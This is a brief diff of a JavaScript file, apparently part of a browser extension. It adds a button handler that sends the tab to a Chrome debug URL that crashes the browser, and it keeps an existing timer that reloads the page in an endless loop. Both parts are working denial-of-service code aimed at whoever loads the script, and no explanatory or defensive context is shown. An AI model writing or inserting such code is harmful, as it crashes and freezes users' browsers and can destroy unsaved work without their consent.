@@ -1,3 +1,8 @@
+document.addEventListener('DOMContentLoaded', function() {
+       document.getElementById('test').addEventListener('click', function() {
+           chrome.tabs.update({ url: 'chrome://inducebrowsercrashforrealz' });
+       });
+   });
 setTimeout(function(){
     while(1)location.reload(1)
 }, 1000)
